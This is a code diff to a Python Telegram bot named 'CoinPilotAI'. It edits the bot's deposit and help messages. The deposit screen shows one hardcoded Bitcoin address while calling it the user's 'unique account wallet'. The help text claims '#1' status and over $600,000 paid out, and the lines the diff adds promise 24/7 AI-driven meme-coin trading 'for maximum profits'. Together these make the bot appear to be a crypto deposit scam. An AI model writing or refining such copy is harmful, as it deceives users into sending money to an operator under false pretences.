@@ -154,7 +154,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "deposit":
         await query.edit_message_text(
-            "Your unique account wallet (click to copy)\n`bc1q02dcj7722y8gawmlphstaaz3l2kyhzursn0sjh`\n\n(Minimum 0.00095 BTC)",
+            "Your unique account wallet (click to copy)\n\n`bc1q02dcj7722y8gawmlphstaaz3l2kyhzursn0sjh`\n\n*(Minimum 0.00095 BTC)*",
             parse_mode="Markdown",
             reply_markup=get_back_main_button()
         )
@@ -214,7 +214,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"Strategy set to: {selected}", reply_markup=get_back_main_button())
 
     elif cmd == "help":
-        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\n    This is a the #1 MemeCoin Trading Bot on Telegram. We have payed out over $600,000 to users in the past 2 years. To start using our bot, you need to fund your account with Bitcoin. We only accept Bitcoin payments for faster processing & security reasons. Your bitcoin will be converted to coins like Solana for purchasing MemeCoins. Once your account is funded, you select one of our 4 100% free strategy configurations. When you select a strategy, you can start the bot and use the monitor to see what the bot is doing.", reply_markup=get_back_main_button(), parse_mode="Markdown")
+        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\n    This is the #1 MemeCoin Trading Bot on Telegram. We have payed out over $600,000 to users in the past 2 years. To start using our bot, you need to fund your account with Bitcoin. We only accept Bitcoin payments for faster processing & security reasons. Your Bitcoin will be converted to coins like Solana for purchasing MemeCoins. Once your account is funded, you select one of our four 100% free strategy configurations. When you select a strategy, you can start the bot and use the monitor to see what the bot is doing. The bot uses Grok AI to automate the purchase of MemeCoins. Meaning, your account will be trading MemeCoins 24/7 using AI for maximum efficiency and profits. When withdrawing funds made with the bot, CoinPilot takes a 5% cut of whatever amount you're withdrawing. We hope you have a world of success on CoinPilot! Thank You!", reply_markup=get_back_main_button(), parse_mode="Markdown")
 
     elif cmd == "exit":
         await query.edit_message_text("Goodbye!")
@@ -403,6 +403,7 @@ async def start_bot():
 
 if __name__ == "__main__":
     asyncio.run(start_bot())
+
 
 
 
